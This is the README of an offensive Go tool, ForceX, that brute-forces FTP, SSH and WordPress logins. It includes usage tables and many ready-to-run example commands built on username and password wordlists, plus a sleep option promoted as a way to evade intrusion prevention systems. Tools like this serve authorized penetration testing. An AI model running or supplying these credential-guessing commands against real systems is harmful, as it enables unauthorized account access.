# ForceX
# BruteForce Attack Tool

## Overview

This Go application is a versatile brute force attack tool designed to target various protocols like FTP, SSH, and WordPress login pages. It allows you to provide a range of user names and passwords to attempt login and report successful logins.

## Features

- **FTP Protocol:** Attempt to brute-force FTP login credentials.
- **SSH Protocol:** Attempt to brute-force SSH login credentials.
- **WordPress:** Attempt to brute-force WordPress login credentials.
- **Customizable Input:** Allows the user to specify a list of usernames, passwords, or individual credentials.
- **Protocol-Specific Login:** Supports login attempts for FTP, SSH, and WordPress.
- **Delay Between Requests:** Specify a sleep time between requests to prevent being detected by intrusion prevention systems.

## Installation

### Prerequisites

- Go 1.15+ installed on your machine.

### Steps

1. Clone the repository:
    ```bash
    git clone <repository-url>
    ```
2. Navigate to the project directory:
    ```bash
    cd <project-directory>
    ```
3. Build the application:
    ```bash
    go build -o ForceX
    ```

## Usage

### Command Line Arguments

| Argument      | Description                            |
|---------------|----------------------------------------|
| `--Address`   | IP/Domain Target for BruteForce        |
| `--Protocol`  | Protocol (`wordpress`, `ssh`, `ftp`,)  |
| `--UserList`  | List of user names                     |
| `--PassList`  | Password list                          |
| `--User`      | Single username                        |
| `--Pass`      | Single password                        |
| `--Port`      | Service port                           |
| `--Sleep`     | Time to sleep between requests         |
| `--Wordpress` | Brute force WordPress login page       |
| `--HTMLUSER`  | User field in HTML                     |
| `--HTMLPASS`  | Password field in HTML                 |
| `--Cookies`   | Web cookies                            |
| `--URL`       | URL of login page (e.g., `/admin`)     |

### Example Usage

Below are example commands to run the brute force tool for different protocols.

#### FTP Brute Force

Attempt to brute-force an FTP login:

```bash
./ForceX --Address 192.168.1.1 --Protocol ftp --UserList users.txt --PassList passwords.txt --Port 21 --Sleep 1s
```

- **Address**: The IP address of the target.
- **Protocol**: Set to `ftp` for FTP brute force.
- **UserList**: Path to a file containing a list of usernames.
- **PassList**: Path to a file containing a list of passwords.
- **Port**: The port on which the FTP service is running (default is 21).
- **Sleep**: Time to wait between each login attempt.

#### SSH Brute Force

Attempt to brute-force an SSH login:

```bash
./ForceX --Address 192.168.1.2 --Protocol ssh --UserList users.txt --PassList passwords.txt --Port 22 --Sleep 2s
```

- **Address**: The IP address of the target.
- **Protocol**: Set to `ssh` for SSH brute force.
- **UserList**: Path to a file containing a list of usernames.
- **PassList**: Path to a file containing a list of passwords.
- **Port**: The port on which the SSH service is running (default is 22).
- **Sleep**: Time to wait between each login attempt.

#### WordPress Brute Force

Attempt to brute-force a WordPress login:

```bash
./ForceX  --URL http://example.com/wp-login.php --Protocol wordpress --UserList users.txt --PassList passwords.txt --HTMLUSER user_login --HTMLPASS user_pass --Cookies "session=abcd1234" --Sleep 1s
```

- **URL**: The URL of the WordPress login page.
- **Protocol**: Set to `wordpress` for WordPress brute force.
- **UserList**: Path to a file containing a list of usernames.
- **PassList**: Path to a file containing a list of passwords.
- **HTMLUSER**: The name of the user field in the HTML form (e.g., `user_login`).
- **HTMLPASS**: The name of the password field in the HTML form (e.g., `user_pass`).
- **Cookies**: Any cookies required for the login request (e.g., `session=abcd1234`).
- **Sleep**: Time to wait between each login attempt.

#### Single User and Password (No Lists)

You can also use a single username and password without lists:

```bash
./ForceX  --Address 192.168.1.3 --Protocol ftp --User admin --Pass password123 --Port 21
```

- **User**: A single username to attempt.
- **Pass**: A single password to attempt.

#### Specific Port and Custom Sleep Time

For services running on a non-default port or if you want to customize the sleep time:

```bash
./ForceX --Address 192.168.1.4 --Protocol ssh --UserList users.txt --PassList passwords.txt --Port 2222 --Sleep 500ms
```

- **Port**: Custom port (e.g., `2222` for SSH).
- **Sleep**: Custom sleep time (e.g., `500ms`).

#### Using with Web Cookies

If the login page requires specific cookies to be set:

```bash
./ForceX --URL http://example.com/admin --Protocol wordpress --UserList users.txt --PassList passwords.txt --HTMLUSER admin_user --HTMLPASS admin_pass --Cookies "session=abcd1234; another_cookie=value" --Sleep 1s
```

- **Cookies**: Include all necessary cookies for the request.

### Summary

These examples demonstrate how to use the brute force tool with different protocols, user/password lists, and additional options like sleep time, custom ports, and cookies.

## Output

The tool provides detailed output for each attempt, including:

- Target IP and Protocol
- User and Password Lists or Single Credentials
- Connection Port
- Success or Failure of login attempts

Successful login details are clearly displayed with user-friendly icons.


### FTP Brute Force

#### FTP Brute Force Wordlist User and Password
```bash
../ForceX --Address 192.168.1.1 --Protocol ftp --UserList users.txt --PassList passwords.txt --Port 21
```

#### FTP Brute Force Wordlist Users - Known Password 
```bash
../ForceX --Address 192.168.1.1 --Protocol ftp --UserList users.txt --Pass password123 --Port 21
```

#### FTP Brute Force Known Username - Wordlist Passwords
```bash
../ForceX --Address 192.168.1.1 --Protocol ftp --User users123 --PassList passwords.txt --Port 21
```

#### FTP Brute Force Known Password and Username 
```bash
../ForceX --Address 192.168.1.1 --Protocol ftp --User users123 --Pass password123 --Port 21
```

### SSH Brute Force

#### SSH Brute Force Wordlist User and Password
```bash
../ForceX --Address 192.168.1.2 --Protocol ssh --UserList users.txt --PassList passwords.txt --Port 22
```

#### SSH Brute Force Wordlist Users - Known Password
```bash
../ForceX --Address 192.168.1.2 --Protocol ssh --UserList users.txt --Pass password123 --Port 22
```

#### SSH Brute Force Known Username - Wordlist Passwords
```bash
../ForceX --Address 192.168.1.2 --Protocol ssh --User users123 --PassList passwords.txt --Port 22
```

#### SSH Brute Force Known Password and Username
```bash
../ForceX --Address 192.168.1.2 --Protocol ssh --User users123 --Pass password123 --Port 22
```

### WordPress Brute Force

#### WordPress Brute Force Wordlist User and Password
```bash
../ForceX --URL http://example.com/wp-login.php --Protocol wordpress --UserList users.txt --PassList passwords.txt 
```

#### WordPress Brute Force Wordlist Users - Known Password
```bash
../ForceX --URL http://example.com/wp-login.php --Protocol wordpress --UserList users.txt --Pass password123 
```

#### WordPress Brute Force Known Username - Wordlist Passwords
```bash
../ForceX --URL http://example.com/wp-login.php --Protocol wordpress --User users123 --PassList passwords.txt 
```

#### WordPress Brute Force one Password and Username
```bash
../ForceX --URL http://example.com/wp-login.php --Protocol wordpress --User users123 --Pass password123 
```

## Notes

- This tool is designed for educational purposes only. Unauthorized access to computer systems is illegal and unethical.
- Use responsibly and ensure you have permission to test the systems you target.


## Contributing

Contributions are welcome! Please fork the repository and create a pull request.

## Contact

For issues, questions, or suggestions, please create an issue in the repository.
